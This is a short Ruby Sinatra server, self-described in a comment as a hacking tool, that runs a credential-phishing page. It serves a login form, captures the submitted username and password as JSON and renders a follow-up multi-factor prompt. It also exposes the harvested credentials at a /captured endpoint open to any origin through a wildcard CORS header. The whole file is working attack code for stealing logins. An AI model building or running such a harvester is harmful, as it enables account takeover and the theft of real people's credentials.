#!/usr/bin/env ruby

require 'json'
require 'sinatra'

$values = 'none'.to_json

set :bind, '0.0.0.0'

get '/' do
  send_file 'public/index.html'
end

get '/captured' do
  # Alert: CORS * is near-universally a bad idea.
  # Being literally a hacking tool I'm going to allow it, but please note, in any other context,
  # this could be the dumbest code ever written. Please don't do this.
  headers 'Access-Control-Allow-Origin' => '*'

  $values
end

post '/capture' do
  $values = {login: params['UsernameForm'],
     passwd: params['PasswordForm'] }.to_json
  @email = params['UsernameForm']
  erb :mfa
end
